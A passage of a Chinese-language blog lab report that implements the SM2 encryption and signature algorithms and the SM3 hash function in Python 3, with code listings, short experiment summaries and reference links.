class=\"line\">        P1 = AddPoint(P1, P2,len_para)</span><br><span class=\"line\">        P1 = ConvertJacb2Nor(P1,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\">    x = int(P1[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (r == ((e + x) % sm2_N))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 签名函数, E消息的hash，DA私钥，K随机数，均为16进制字符串</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Sign</span><span class=\"params\">(E, DA, K,len_para)</span>:</span></span><br><span class=\"line\">    e = int(E, <span class=\"number\">16</span>)</span><br><span class=\"line\">    d = int(DA, <span class=\"number\">16</span>)</span><br><span class=\"line\">    k = int(K, <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    P1 = kG(k, sm2_G,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\">    x = int(P1[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    R = ((e + x) % sm2_N)</span><br><span class=\"line\">    d_1 = pow(d+<span class=\"number\">1</span>, sm2_N - <span class=\"number\">2</span>, sm2_N)</span><br><span class=\"line\">    S = (d_1*(k + R) - R) % sm2_N</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'%064x%064x'</span> % (R,S)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密函数，M消息，PA公钥</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Encrypt</span><span class=\"params\">(M,PA,len_para,Hexstr = <span class=\"number\">0</span>)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> Hexstr:</span><br><span class=\"line\">        msg = M <span class=\"comment\"># 输入消息本身是16进制字符串</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        msg = SM3.str2byte(M)</span><br><span class=\"line\">        msg = SM3.byte2hex(msg) <span class=\"comment\"># 消息转化为16进制字符串</span></span><br><span class=\"line\">    k = get_random_str(len_para)</span><br><span class=\"line\">    <span class=\"comment\"># k = '59276E27D506861A16680F3AD9C02DCCEF3CC1FA3CDBE4CE6D54B80DEAC1BC21'</span></span><br><span class=\"line\">    <span class=\"comment\"># k = '384F30353073AEECE7A1654330A96204D37982A3E15B2CB5'</span></span><br><span class=\"line\">    C1 = kG(int(k, <span class=\"number\">16</span>),sm2_G, len_para)</span><br><span class=\"line\">    <span class=\"comment\"># print('C1 = %s'%C1)</span></span><br><span class=\"line\">    xy = kG(int(k, <span class=\"number\">16</span>), PA, len_para)</span><br><span class=\"line\">    <span class=\"comment\"># print('xy = %s' % xy)</span></span><br><span class=\"line\">    x2 = xy[<span class=\"number\">0</span>:len_para]</span><br><span class=\"line\">    y2 = xy[len_para:<span class=\"number\">2</span> * len_para]</span><br><span class=\"line\">    ml = len(msg)</span><br><span class=\"line\">    <span class=\"comment\"># print('ml = %d'% ml)</span></span><br><span class=\"line\">    t = SM3.KDF(xy,ml / <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print(t)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> int(t,<span class=\"number\">16</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        form = <span class=\"string\">'%%0%dx'</span> % ml</span><br><span class=\"line\">        C2 = form % (int(msg,<span class=\"number\">16</span>) ^ int(t,<span class=\"number\">16</span>))</span><br><span class=\"line\">        <span class=\"comment\"># print('C2 = %s'% C2)</span></span><br><span class=\"line\">        <span class=\"comment\"># print('%s%s%s'% (x2,msg,y2))</span></span><br><span class=\"line\">        C3 = SM3.Hash_sm3(<span class=\"string\">'%s%s%s'</span>% (x2,msg,y2),<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print('C3 = %s' % C3)</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'%s%s%s'</span> % (C1,C3,C2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密函数，C密文（16进制字符串），DA私钥</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Decrypt</span><span class=\"params\">(C, DA, len_para)</span>:</span></span><br><span class=\"line\">    len_2 = <span class=\"number\">2</span> * len_para</span><br><span class=\"line\">    len_3 = len_2 + <span class=\"number\">64</span></span><br><span class=\"line\">    C1 = C[<span class=\"number\">0</span>:len_2]</span><br><span class=\"line\">    C3 = C[len_2:len_3]</span><br><span class=\"line\">    C2 = C[len_3:]</span><br><span class=\"line\">    xy = kG(int(DA,<span class=\"number\">16</span>), C1, len_para)</span><br><span class=\"line\">    <span class=\"comment\"># print('xy = %s' % xy)</span></span><br><span class=\"line\">    x2 = xy[<span class=\"number\">0</span>:len_para]</span><br><span class=\"line\">    y2 = xy[len_para:len_2]</span><br><span class=\"line\">    cl = len(C2)</span><br><span class=\"line\">    <span class=\"comment\"># print(cl)</span></span><br><span class=\"line\">    t = SM3.KDF(xy, cl/<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print('t = %s'%t)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> int(t,<span class=\"number\">16</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        form = <span class=\"string\">'%%0%dx'</span> % cl</span><br><span class=\"line\">        M = form % (int(C2,<span class=\"number\">16</span>) ^ int(t,<span class=\"number\">16</span>))</span><br><span class=\"line\">        <span class=\"comment\"># print('M = %s' % M)</span></span><br><span class=\"line\">        u = SM3.Hash_sm3(<span class=\"string\">'%s%s%s'</span>% (x2,M,y2),<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>  (u == C3):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> M</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    len_para = int(Fp / <span class=\"number\">4</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print(len_para)</span></span><br><span class=\"line\">    <span class=\"comment\"># e = get_random_str(len_para)</span></span><br><span class=\"line\">    e = SM3.byte2hex(SM3.str2byte(<span class=\"string\">'we are student'</span>))</span><br><span class=\"line\">    d = get_random_str(len_para)</span><br><span class=\"line\">    k = get_random_str(len_para)</span><br><span class=\"line\">    <span class=\"comment\"># e = '656E6372797074696F6E207374616E64617264'</span></span><br><span class=\"line\">    <span class=\"comment\"># d = '3945208F7B2144B13F36E38AC6D39F95889393692860B51A42FB81EF4DF7C5B8'</span></span><br><span class=\"line\">    <span class=\"comment\"># d = '58892B807074F53FBF67288A1DFAA1AC313455FE60355AFD'</span></span><br><span class=\"line\">    Pa = kG(int(d, <span class=\"number\">16</span>), sm2_G, len_para)</span><br><span class=\"line\">    Sig = Sign(e, d, k, len_para)</span><br><span class=\"line\">    print(Verify(Sig, e, Pa, len_para))</span><br><span class=\"line\">    <span class=\"comment\"># print(Pa)</span></span><br><span class=\"line\">    print(<span class=\"string\">'M = %s'</span> % e)</span><br><span class=\"line\">    C = Encrypt(e, Pa, len_para, <span class=\"number\">1</span>)</span><br><span class=\"line\">    print(<span class=\"string\">'C = %s'</span> % C)</span><br><span class=\"line\">    print(<span class=\"string\">'Decrypt'</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print(Decrypt(C, d, len_para))</span></span><br><span class=\"line\">    print(Decrypt(C, d, len_para))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"image-20200401190116841.png\" alt=\"image-20200401190116841\"></p>\n<h2 id=\"实验总结-1\"><a href=\"#实验总结-1\" class=\"headerlink\" title=\"实验总结\"></a>实验总结</h2><p>SM2加密算法在Java中同样也可以基于使用BouncyCastle库实现。一般使用数字证书来标识身份，同时使用证书中公钥加密数据。SM2中有随机数的参与，所以每次即使相同的明文也会加密成不同的密文。</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p><a href=\"http://www.jonllen.com/jonllen/work/164.aspx\" target=\"_blank\" rel=\"noopener\">SM2非对称算法加解密</a></p>\n<h1 id=\"实现SM2签名算法。给出“we-are-student”的签名。\"><a href=\"#实现SM2签名算法。给出“we-are-student”的签名。\" class=\"headerlink\" title=\"实现SM2签名算法。给出“we are student”的签名。\"></a>实现SM2签名算法。给出“we are student”的签名。</h1><h2 id=\"实验摘要-2\"><a href=\"#实验摘要-2\" class=\"headerlink\" title=\"实验摘要\"></a>实验摘要</h2><p>SM3数字签名部分和加解密部分相似</p>\n<h2 id=\"代码-2\"><a href=\"#代码-2\" class=\"headerlink\" title=\"代码\"></a>代码</h2><p>此部分代码包含在上一个代码里，在此仅把关键部分摘出</p>\n<h3 id=\"Python3-2\"><a href=\"#Python3-2\" class=\"headerlink\" title=\"Python3\"></a>Python3</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 验签函数，Sign签名r||s，E消息hash，PA公钥</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Verify</span><span class=\"params\">(Sign, E, PA,len_para)</span>:</span></span><br><span class=\"line\">    r = int(Sign[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    s = int(Sign[len_para:<span class=\"number\">2</span>*len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    e = int(E, <span class=\"number\">16</span>)</span><br><span class=\"line\">    t = (r + s) % sm2_N</span><br><span class=\"line\">    P1 = kG(s, sm2_G,len_para)</span><br><span class=\"line\">    P2 = kG(t, PA,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> P1 == P2:</span><br><span class=\"line\">        P1 = <span class=\"string\">'%s%s'</span> % (P1, <span class=\"number\">1</span>)</span><br><span class=\"line\">        P1 = DoublePoint(P1,len_para)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        P1 = <span class=\"string\">'%s%s'</span> % (P1, <span class=\"number\">1</span>)</span><br><span class=\"line\">        P1 = AddPoint(P1, P2,len_para)</span><br><span class=\"line\">        P1 = ConvertJacb2Nor(P1,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\">    x = int(P1[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (r == ((e + x) % sm2_N))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 签名函数, E消息的hash，DA私钥，K随机数，均为16进制字符串</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Sign</span><span class=\"params\">(E, DA, K,len_para)</span>:</span></span><br><span class=\"line\">    e = int(E, <span class=\"number\">16</span>)</span><br><span class=\"line\">    d = int(DA, <span class=\"number\">16</span>)</span><br><span class=\"line\">    k = int(K, <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    P1 = kG(k, sm2_G,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\">    x = int(P1[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    R = ((e + x) % sm2_N)</span><br><span class=\"line\">    d_1 = pow(d+<span class=\"number\">1</span>, sm2_N - <span class=\"number\">2</span>, sm2_N)</span><br><span class=\"line\">    S = (d_1*(k + R) - R) % sm2_N</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'%064x%064x'</span> % (R,S)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"image-20200401190353179.png\" alt=\"image-20200401190353179\"></p>\n<h2 id=\"实验总结-2\"><a href=\"#实验总结-2\" class=\"headerlink\" title=\"实验总结\"></a>实验总结</h2><p>对于要签名的信息e，这个是原始信息经过一定的处理通过散列函数得到的，散列算法用的是国密SM3算法</p>\n<p><strong>参考文献：</strong></p>\n<ol>\n<li><a href=\"http://download.csdn.net/download/lict09/10131858\" target=\"_blank\" rel=\"noopener\">国密SM3算法及基于SM3的密钥派生函数KDF</a></li>\n<li><a href=\"http://download.csdn.net/download/lict09/10131863\" target=\"_blank\" rel=\"noopener\">python3实现的国密SM2</a></li>\n</ol>\n<h1 id=\"实现SM3算法\"><a href=\"#实现SM3算法\" class=\"headerlink\" title=\"实现SM3算法\"></a>实现SM3算法</h1><h2 id=\"实验摘要-3\"><a href=\"#实验摘要-3\" class=\"headerlink\" title=\"实验摘要\"></a>实验摘要</h2><p>SM3主要部分包括：所需函数—布尔函数和置换函数，和参数（IV、T）。SM3对数据进行扩展和填充，然后迭代压缩生成Hash值。</p>\n<h2 id=\"代码-3\"><a href=\"#代码-3\" class=\"headerlink\" title=\"代码\"></a>代码</h2><h3 id=\"Python3-3\"><a href=\"#Python3-3\" class=\"headerlink\" title=\"Python3\"></a>Python3</h3> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> ceil</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始值IV</span></span><br><span class=\"line\">IV = <span class=\"string\">'7380166f 4914b2b9 172442d7 da8a0600 a96f30bc 163138aa e38dee4d b0fb0e4e'</span></span><br><span class=\"line\">IV = int(IV.replace(<span class=\"string\">' '</span>, <span class=\"string\">''</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"comment\"># IV = 52242288850037289314637692563605787808083148960692295188198367823108413001294</span></span><br><span class=\"line\"><span class=\"comment\"># 接下来挨个取出来IV</span></span><br><span class=\"line\">a = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">8</span>):</span><br><span class=\"line\">    a.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    a[i] = (IV &gt;&gt; ((<span class=\"number\">7</span> - i) * <span class=\"number\">32</span>)) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">IV = a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印输出</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">out_hex</span><span class=\"params\">(list1)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> list1:</span><br><span class=\"line\">        print(<span class=\"string\">\"%08x\"</span> % i)</span><br><span class=\"line\">    print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 循环左移</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rotate_left</span><span class=\"params\">(a, k)</span>:</span></span><br><span class=\"line\">    k = k % <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((a &lt;&lt; k) &amp; <span class=\"number\">0xFFFFFFFF</span>) | ((a &amp; <span class=\"number\">0xFFFFFFFF</span>) &gt;&gt; (<span class=\"number\">32</span> - k))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 常量T</span></span><br><span class=\"line\">T_j = []</span><br><span class=\"line\"><span class=\"comment\"># 0&lt;= j &lt;= 15</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">16</span>):</span><br><span class=\"line\">    T_j.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    T_j[i] = <span class=\"number\">0x79cc4519</span></span><br><span class=\"line\"><span class=\"comment\"># 16&lt;= j &lt;= 63</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>, <span class=\"number\">64</span>):</span><br><span class=\"line\">    T_j.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    T_j[i] = <span class=\"number\">0x7a879d8a</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 布尔函数FF_J，起混淆作用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">FF_j</span><span class=\"params\">(X, Y, Z, j)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= j &lt; <span class=\"number\">16</span>:</span><br><span class=\"line\">        ret = X ^ Y ^ Z</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"number\">16</span> &lt;= j &lt; <span class=\"number\">64</span>:</span><br><span class=\"line\">        ret = (X &amp; Y) | (X &amp; Z) | (Y &amp; Z)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 布尔函数GG_J，起混淆作用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">GG_j</span><span class=\"params\">(X, Y, Z, j)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= j &lt; <span class=\"number\">16</span>:</span><br><span class=\"line\">        ret = X ^ Y ^ Z</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"number\">16</span> &lt;= j &lt; <span class=\"number\">64</span>:</span><br><span class=\"line\">        <span class=\"comment\"># ret = (X | Y) &amp; ((2 ** 32 - 1 - X) | Z)</span></span><br><span class=\"line\">        ret = (X &amp; Y) | ((~ X) &amp; Z)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 置换函数P_0，起扩散作用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">P_0</span><span class=\"params\">(X)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> X ^ (rotate_left(X, <span class=\"number\">9</span>)) ^ (rotate_left(X, <span class=\"number\">17</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 置换函数P_1，起扩散作用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">P_1</span><span class=\"params\">(X)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> X ^ (rotate_left(X, <span class=\"number\">15</span>)) ^ (rotate_left(X, <span class=\"number\">23</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 压缩函数CF</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CF</span><span class=\"params\">(V_i, B_i)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># 将消息分组按以下方法扩展生成132个字W_0,W_1...W_67,W_0',W_1'...W_63'</span></span><br><span class=\"line\">    <span class=\"comment\"># 将消息分组划分为16个字W_0,W_1...W_15</span></span><br><span class=\"line\">    W = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">        weight = <span class=\"number\">0x1000000</span></span><br><span class=\"line\">        data = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> range(i * <span class=\"number\">4</span>,(i + <span class=\"number\">1</span>) * <span class=\"number\">4</span>):</span><br><span class=\"line\">            data = data + B_i[k] * weight</span><br><span class=\"line\">            weight = int(weight / <span class=\"number\">0x100</span>)</span><br><span class=\"line\">        W.append(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>, <span class=\"number\">68</span>):</span><br><span class=\"line\">        W.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        W[j] = P_1(W[j - <span class=\"number\">16</span>] ^ W[j<span class=\"number\">-9</span>] ^ (rotate_left(W[j - <span class=\"number\">3</span>], <span class=\"number\">15</span>))) ^ (rotate_left(W[j - <span class=\"number\">13</span>], <span class=\"number\">7</span>)) ^ W[j - <span class=\"number\">6</span>]</span><br><span class=\"line\">        <span class=\"comment\"># str1 = \"%08x\" % W[j]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># W_j' = W_j ^ W_j+4</span></span><br><span class=\"line\">    W_1 = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">64</span>):</span><br><span class=\"line\">        W_1.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        W_1[j] = W[j] ^ W[j+<span class=\"number\">4</span>]</span><br><span class=\"line\">        <span class=\"comment\"># str1 = \"%08x\" % W_1[j]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    A, B, C, D, E, F, G, H = V_i</span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    print \"00\",</span></span><br><span class=\"line\"><span class=\"string\">    out_hex([A, B, C, D, E, F, G, H])</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 压缩函数，令ABCDEFGH为字寄存器，SS1,SS2,TT1,TT2为中间变量，压缩函数V_i+1 = CF(V_(i), B_(i))</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">64</span>):</span><br><span class=\"line\">        SS1 = rotate_left(((rotate_left(A, <span class=\"number\">12</span>)) + E + (rotate_left(T_j[j], j))) &amp; <span class=\"number\">0xFFFFFFFF</span>, <span class=\"number\">7</span>)</span><br><span class=\"line\">        SS2 = SS1 ^ (rotate_left(A, <span class=\"number\">12</span>))</span><br><span class=\"line\">        TT1 = (FF_j(A, B, C, j) + D + SS2 + W_1[j]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        TT2 = (GG_j(E, F, G, j) + H + SS1 + W[j]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        D = C</span><br><span class=\"line\">        C = rotate_left(B, <span class=\"number\">9</span>)</span><br><span class=\"line\">        B = A</span><br><span class=\"line\">        A = TT1</span><br><span class=\"line\">        H = G</span><br><span class=\"line\">        G = rotate_left(F, <span class=\"number\">19</span>)</span><br><span class=\"line\">        F = E</span><br><span class=\"line\">        E = P_0(TT2)</span><br><span class=\"line\"></span><br><span class=\"line\">        A = A &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        B = B &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        C = C &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        D = D &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        E = E &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        F = F &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        G = G &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        H = H &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        str1 = \"%02d\" % j</span></span><br><span class=\"line\"><span class=\"string\">        if str1[0] == \"0\":</span></span><br><span class=\"line\"><span class=\"string\">            str1 = ' ' + str1[1:]</span></span><br><span class=\"line\"><span class=\"string\">        print str1,</span></span><br><span class=\"line\"><span class=\"string\">        out_hex([A, B, C, D, E, F, G, H])</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    V_i_1 = []</span><br><span class=\"line\">    V_i_1.append(A ^ V_i[<span class=\"number\">0</span>])</span><br><span class=\"line\">    V_i_1.append(B ^ V_i[<span class=\"number\">1</span>])</span><br><span class=\"line\">    V_i_1.append(C ^ V_i[<span class=\"number\">2</span>])</span><br><span class=\"line\">    V_i_1.append(D ^ V_i[<span class=\"number\">3</span>])</span><br><span class=\"line\">    V_i_1.append(E ^ V_i[<span class=\"number\">4</span>])</span><br><span class=\"line\">    V_i_1.append(F ^ V_i[<span class=\"number\">5</span>])</span><br><span class=\"line\">    V_i_1.append(G ^ V_i[<span class=\"number\">6</span>])</span><br><span class=\"line\">    V_i_1.append(H ^ V_i[<span class=\"number\">7</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> V_i_1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hash_msg</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># 将消息填充为512比特(64字节)的整数倍</span></span><br><span class=\"line\">    len1 = len(msg)</span><br><span class=\"line\">    reserve1 = len1 % <span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"comment\"># 先添加一个1bit</span></span><br><span class=\"line\">    msg.append(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    reserve1 = reserve1 + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\"># 56-64, add 64 byte</span></span><br><span class=\"line\">    <span class=\"comment\"># 即如果目前长度占用最后8个byte的表示长度的位置，则另外再增加64byte</span></span><br><span class=\"line\">    range_end = <span class=\"number\">56</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> reserve1 &gt; range_end:</span><br><span class=\"line\">        range_end = range_end + <span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"comment\"># 从新增的1到倒数第65bit全部填充0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(reserve1, range_end):</span><br><span class=\"line\">        msg.append(<span class=\"number\">0x00</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    bit_length = (len1) * <span class=\"number\">8</span></span><br><span class=\"line\">    bit_length_str = [bit_length % <span class=\"number\">0x100</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>):</span><br><span class=\"line\">        bit_length = int(bit_length / <span class=\"number\">0x100</span>)</span><br><span class=\"line\">        bit_length_str.append(bit_length % <span class=\"number\">0x100</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        msg.append(bit_length_str[<span class=\"number\">7</span> - i])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># group_count = round(len(msg) / 64)</span></span><br><span class=\"line\">    <span class=\"comment\"># 组数</span></span><br><span class=\"line\">    group_count = len(msg) // <span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\">    B = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, group_count):</span><br><span class=\"line\">        B.append(msg[i * <span class=\"number\">64</span>:(i + <span class=\"number\">1</span>) * <span class=\"number\">64</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    V = []</span><br><span class=\"line\">    V.append(IV)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, group_count):</span><br><span class=\"line\">        V.append(CF(V[i], B[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">    y = V[i+<span class=\"number\">1</span>]</span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> y:</span><br><span class=\"line\">        result = <span class=\"string\">'%s%08x'</span> % (result, i)</span><br><span class=\"line\">    <span class=\"comment\"># 最后的结果</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 字符串转换成byte数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2byte</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    ml = len(msg)</span><br><span class=\"line\">    msg_byte = []</span><br><span class=\"line\">    msg_bytearray = msg.encode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(ml):</span><br><span class=\"line\">        <span class=\"comment\"># msg_byte.append(ord(msg[i]))</span></span><br><span class=\"line\">        msg_byte.append(msg_bytearray[i])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> msg_byte</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 16进制字符串转换成byte数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hex2byte</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    ml = len(msg)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ml % <span class=\"number\">2</span> != <span class=\"number\">0</span>:</span><br><span class=\"line\">        msg = <span 